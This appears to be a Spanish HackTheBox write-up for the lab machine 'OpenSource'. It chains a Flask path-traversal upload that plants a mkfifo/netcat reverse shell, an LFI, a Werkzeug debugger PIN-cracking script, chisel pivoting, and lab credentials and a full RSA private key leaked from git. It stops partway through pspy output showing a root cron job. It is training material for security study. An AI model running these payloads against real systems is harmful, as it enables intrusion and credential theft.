---
title: OpenSource | Linux
published: 2025-10-04
image: "./logo.png"
tags: [Easy, Linux, Web Enum, Github Enum, Information Leakage, RCE, LFI, Werkzeug Debugger, Port Forwarding, Pivoting, Abusing Gitea, Abusing Cron Job + Git Hooks, eWPT, e WPTXv2, OSWE, eCPPTv3, OSCP]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Web Enumeration
- Github Project Enumeration
- Information Leakage
- Abusing File Upload - Replacing Python Files [RCE]
- Local File Inclusion (LFI)
- Shell via Flask Debug - Finding out the PIN (Werkzeug Debugger) [Unintended Way]
- Playing with Chisel - Remote Port Forwarding [PIVOTING]
- Abusing Gitea + Information Leakage
- Abusing Cron Job + Git Hooks [Privilege Escalation]

### Preparación

- eWPT
- eWPTXv2
- OSWE
- eCPPTv3
- OSCP

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.11.164`       | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p22,80 10.10.11.164 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.11.164`       | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug httpd 2.1.2 (Python 3.10.3)
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Whatweb

Para enumerar las tecnologías que está utilizando el servicio web usaremos `whatweb`:

```bash wrap=false
❯ whatweb http://10.10.11.164
http://10.10.11.164 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.2 Python/3.10.3], IP[10.10.11.164], JQuery[3.4.1], Python[3.10.3], Script, Title[upcloud - Upload files for Free!], Werkzeug[2.1.2]
```

### Wfuzz

Para hacernos mejor a la idea de la estructura de la web vamos a probar **fuzzing** con la herramienta `wfuzz`:

```bash wrap=false
❯ wfuzz -c -L --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt http://10.10.11.164/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.164/FUZZ
Total requests: 29999

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000042:   200        9802 L   92977 W    2359649 Ch   "download"                                                                                                                                                                                                                          
000001450:   200        45 L     144 W      1563 Ch     "console" 
```

### source.zip

La ruta `/download` nos descarga un `source.zip`:

```bash wrap=false
❯ ls -la
drwxrwxr-x zelpro zelpro 4.0 KB Sat Sep 27 15:01:20 2025  .
drwxrwxr-x zelpro zelpro 4.0 KB Sat Sep 27 15:01:20 2025  ..
drwxrwxr-x zelpro zelpro 4.0 KB Sat Sep 27 15:01:22 2025  .git
drwxrwxr-x zelpro zelpro 4.0 KB Thu Apr 28 13:45:52 2022  app
drwxr-xr-x zelpro zelpro 4.0 KB Thu Apr 28 13:34:45 2022  config
.rwxr-xr-x zelpro zelpro 110 B  Thu Apr 28 13:40:20 2022  build-docker.sh
.rw-rw-r-- zelpro zelpro 574 B  Thu Apr 28 14:50:20 2022  Dockerfile
```

Vemos que tenemos una copia de la web incluyendo datos del repositorio. Dentro de `/app` existe `views.py`:

```python wrap=false title='views.py'
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Aquí podemos ver la estructura de la web, vemos que en la subida de archivos se aplica una sanitización para impedir subir archivos a otros directorios:

```python wrap=false title='utils.py'
import time

def current_milli_time():
    return round(time.time() * 1000)

"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""

def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

"""
TODO: get unique filename
"""

def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension

"""
Recursively replace a pattern in a string
"""

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

Por esa parte nos han capado, sin embargo en la siguiente línea está: `file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)`, que esto puede dar un problema muy grave:

```bash wrap=false
❯ python
Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.path.join(os.getcwd(), "public", "uploads", "zelpro.txt")
... 
'/home/zelpro/HTB/OpenSource/content/source/app/app/public/uploads/zelpro.txt'
>>> os.path.join(os.getcwd(), "public", "uploads", "/zelpro.txt")
'/zelpro.txt'
```

## Explotación

### Replacing views.py

Si ponemos una `/` en el nombre se salta el resto de la ruta. Sabiendo que estamos en `/app/app/` podríamos sustituir el `views.py` por este:

```python wrap=false title='views.py (MODIFIED)'
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def cmd():
    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f")
```

Esto hace que la ruta `/shell` nos devuelva una **reverse shell** por el puerto que escojamos:

```bash wrap=false
❯ sudo nc -lvnp 4444
[sudo] contraseña para zelpro: 
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.164] 45081
/bin/sh: can't access tty; job control turned off
/app # whoami
root
/app # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
18: eth0@if19: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:09 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.9/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Vemos que estamos en un contenedor.

### Flask Debug [Unintended way]

Podemos ver que el modo **debug** de `Flask` está activado como nos muestra el repositorio. Anteriormente vimos la ruta `/console` mediante **fuzzing**:

![Protected console](./1.png)

Esto está disponible en `Werkzeug` y el PIN se computa de manera estática y se puede descifrar. Si nos fijamos en la ruta `/uploads` vemos que usa el mismo sistema que la subida de archivos, por lo que debería ser posible un **LFI**:

```bash wrap=false
curl --path-as-is http://10.10.11.164/uploads/..//etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.15.1
PRETTY_NAME="Alpine Linux v3.15"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.org/"
```

Efectivamente, para computar el PIN está muy bien esta [página](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug), este es el script que se nos comparte para ello:

```python wrap=false title="PIN Exploit"
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

El campo **username** es `root`, y la ruta del `app.py` la podemos encontrar al apuntar a una ruta que no existe:

```bash wrap=false
❯ curl --path-as-is http://10.10.11.164/uploads/..//a | tail
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15739  100 15739    0     0   115k      0 --:--:-- --:--:-- --:--:--  115k
  File "/app/app/views.py", line 33, in send_report
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
  File "/usr/local/lib/python3.10/site-packages/flask/helpers.py", line 610, in send_file
    return werkzeug.utils.send_file(
  File "/usr/local/lib/python3.10/site-packages/werkzeug/utils.py", line 440, in send_file
    stat = os.stat(path)
FileNotFoundError: [Errno 2] No such file or directory: '/a'

-->
```

La parte pública del script ya la tendríamos, en la parte privada necesitaremos la **MAC** en `decimal`:

```bash wrap=false
❯ curl --path-as-is http://10.10.11.164/uploads/..//sys/class/net/eth0/address
02:42:ac:11:00:09
❯ python3
Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0242ac110009
2485377892361
```

Y para el `ID` usaremos curl a la siguiente ruta con el parámetro `--ignore-content-length`:

```bash wrap=false
❯ curl --path-as-is http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id
❯ curl --path-as-is http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id --ignore-content-length
a3fce266-ca85-4988-aa7c-e2abbd0381b3
```

A esto le deberemos concatenar lo siguiente:

```bash wrap=false
❯ curl --path-as-is http://10.10.11.164/uploads/..//proc/self/cgroup --ignore-content-length
12:cpuset:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
11:memory:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
10:hugetlb:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
9:devices:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
8:cpu,cpuacct:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
7:rdma:/
6:pids:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
5:net_cls,net_prio:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
4:freezer:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
3:blkio:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
2:perf_event:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
1:name=systemd:/docker/467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b
0::/system.slice/snap.docker.dockerd.service
```

Quedando así:

```bash wrap=false
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
private_bits = [
    '2485377892361',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'a3fce266-ca85-4988-aa7c-e2abbd0381b3467e52b1b86b9f34118789d78acb27cee070b9feb0276851a3120d6a1d4c835b'  # get_machine_id(), /etc/machine-id
]
```

```bash wrap=false title="Obtenemos el PIN"
❯ python3 pin_exploit.py
138-540-334
```

![Working console](./2.png)

Ahora simplemente ejecutammos el `one-liner` de antes para obtener la **reverse shell**:

```bash wrap=false
❯ sudo nc -lvnp 4444
[sudo] contraseña para zelpro: 
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.164] 43867
/bin/sh: can't access tty; job control turned off
/app # whoami
root
```

## Escalada de privilegios

### Saliendo del contenedor

Si vemos los puertos abiertos dentro de la máquina host del contenedor, vemos el **3000**:

```bash wrap=false
/ # for port in $(seq 1 10000); do nc 172.17.0.1 $port  -zv; done
172.17.0.1 (172.17.0.1:22) open
172.17.0.1 (172.17.0.1:80) open
172.17.0.1 (172.17.0.1:3000) open
172.17.0.1 (172.17.0.1:6000) open
172.17.0.1 (172.17.0.1:6001) open
172.17.0.1 (172.17.0.1:6002) open
172.17.0.1 (172.17.0.1:6003) open
172.17.0.1 (172.17.0.1:6004) open
172.17.0.1 (172.17.0.1:6005) open
172.17.0.1 (172.17.0.1:6006) open
172.17.0.1 (172.17.0.1:6007) open
```

El puerto `3000` se ve interesante, vamos a ver que contiene:

```bash wrap=false
/ # wget http://172.17.0.1:3000/ -qO-    
...
		<div class="ui left">
			Powered by Gitea Version: 1.16.6 Page: <strong>16ms</strong> Template: <strong>8ms</strong>
		</div>
...
```

Vemos el servicio **Gitea**, vamos a hacer `port forwarding` con **chisel** para verlo mejor. Nos lo descargaremos y lo pasaremos a la máquina víctima:

```bash wrap=false title='Máquina atacante'
❯ mv /home/zelpro/Descargas/chisel_1.11.3_linux_amd64.gz chisel.gz
❯ gunzip chisel.gz
❯ ls
 chisel   pin_exploit.py
❯ chmod +x chisel
❯ upx chisel
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.4       Markus Oberhumer, Laszlo Molnar & John Reiser    May 9th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
  10240184 ->   4021468   39.27%   linux/amd64   chisel                        

Packed 1 file.
❯ du
3936	.
❯ du -hc chisel
3,9M	chisel
3,9M	total
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash wrap=false title='Máquina víctima'
/ # ping -c 1 10.10.14.15
PING 10.10.14.15 (10.10.14.15): 56 data bytes
64 bytes from 10.10.14.15: seq=0 ttl=62 time=47.374 ms

--- 10.10.14.15 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 47.374/47.374/47.374 ms
/ # cd /tmp
/tmp # wget http://10.10.14.15/chisel
Connecting to 10.10.14.15 (10.10.14.15:80)
wget: server returned error: HTTP/1.1 404 NOT FOUND
/tmp # wget http://10.10.14.15:80/chisel    
Connecting to 10.10.14.15:80 (10.10.14.15:80)
wget: server returned error: HTTP/1.1 404 NOT FOUND
/tmp # wget http://10.10.14.15:8000/chisel
Connecting to 10.10.14.15:8000 (10.10.14.15:8000)
saving to 'chisel'
chisel                 4% |*                               |  196k  0:00:19 ETA
chisel                31% |**********                      | 1239k  0:00:04 ETA
chisel                31% |**********                      | 1239k  0:00:06 ETA
chisel                41% |*************                   | 1637k  0:00:05 ETA
chisel                52% |****************                | 2071k  0:00:04 ETA
chisel                73% |***********************         | 2892k  0:00:02 ETA
chisel                87% |***************************     | 3430k  0:00:01 ETA
chisel               100% |********************************| 3927k  0:00:00 ETA
'chisel' saved
/tmp # chmod +x chisel
/tmp # ./chisel

  Usage: chisel [command] [--help]

  Version: 1.11.3 (go1.25.1)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel

/tmp # 
```

Y ahora simplemente nos conectamos:

```bash wrap=false title='Máquina atacante'
❯ ./chisel server --reverse -p 1234
2025/10/03 16:15:42 server: Reverse tunnelling enabled
2025/10/03 16:15:42 server: Fingerprint P8slwQ2GP2MrSKbxaejCI6HU9xE0uBrG+/7T6w5RA1w=
2025/10/03 16:15:42 server: Listening on http://0.0.0.0:1234
2025/10/03 23:32:07 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
```

```bash wrap=false title='Máquina víctima'
/tmp # ./chisel client 10.10.14.15:1234 R:3000:172.17.0.1:3000
2025/10/03 21:32:06 client: Connecting to ws://10.10.14.15:1234
2025/10/03 21:32:07 client: Connected (Latency 45.622202ms)
```

![Gitea](./3.png)

Vemos que nos podemos loguear, pero no tenemos **credenciales**. Sin embargo, en el primer repositorio que descargamos en la rama `dev` encontramos un `commit` con unas credenciales:

```bash wrap=false
❯ git log dev --oneline
c41fede (dev) ease testing
be4da71 added gitignore
a76f8f7 updated
ee9d9f1 initial
❯ git show a76f8f7
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

Tenemos `dev01:Soulless_Developer#2022` vamos a probar:

![Successful login](./4.png)

Una vez dentro, encontramos el repositorio `dev01/home-backup`, dentro encontramos un `.ssh/id_rsa`:

```txt wrap=false
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

```bash wrap=false title='Salimos del contenedor'
❯ nano id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa dev01@10.10.11.164
The authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.
ED25519 key fingerprint is SHA256:LbyqaUq6KgLagQJpfh7gPPdQG/iA2K4KjYGj0k9BMXk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.164' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct  3 22:04:48 UTC 2025

  System load:  0.15              Processes:              223
  Usage of /:   76.1% of 3.48GB   Users logged in:        0
  Memory usage: 28%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$ whoami
dev01
dev01@opensource:~$ ls
user.txt
dev01@opensource:~$ cat user.txt 
64d33c669db1fb9dd...
```

### Escalando a root

Si usamos `pspy` para ver los procesos de la máquina, vemos algo que parece una tarea **cron** de **root**:

```wrap=false
2025/10/03 22:21:01 CMD: UID=0     PID=18679  | /bin/bash /usr/local/bin/git-sync 
2025/10/03 22:21:01 CMD: UID=0     PID=18678  | /bin/sh -c /usr/local/bin/git-sync 
2025/10/03 22:21:01 CMD: UID=0     PID=18677  | /usr/sbin/CRON -f 
2025/10/03 22:21:01 CMD: UID=0     PID=18682  | /bin/bash /usr/local/bin/git-sync 
2025/10/03 22:21:01 CMD: UID=0     PID=18683  | /bin/bash /usr/local/bin/git-sync 
2025/10/03 22:21:01 CMD: UID=0     PID=18684  | git commit -m Backup for 2025-10-03 
2025/10/03 22:21:01 CMD: UID=0     PID=18685  | git push origin main 
2025/10/03 22:21:01 CMD: UID=0     PID=18686  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2025/10/03 22:21:01 CMD: UID=0     PID=18687  | /sbin/modprobe -q -- net-pf-10 
2025/10/03 22:22:01 CMD: UID=0     PID=18698  | /bin/bash /root/meta/app/clean.sh 
2025/10/03 22:22:01 CMD: UID=0     PID=18697  | /bin/bash /root/meta/app/clean.sh 
2025/10/03 22:22:01 CMD: UID=0     PID=18696  | /bin/sh -c cp /root/config /home/dev01/.git/config 
2025/10/03 22:22:01 CMD: UID=0     PID=18695  | /usr/sbin/CRON -f 
2025/10/03 22:22:01 CMD: UID=0     PID=18694  | /bin/bash /root/meta/app/clean.sh 
2025/10/03 22:22:01 CMD: UID=0     PID=18693  | /bin/sh -c cp /root/config /home/dev01/.git/config 
2025/10/03 22:22:01 CMD: UID=0     PID=18692  | /bin/sh -c /root/meta/app/clean.sh 
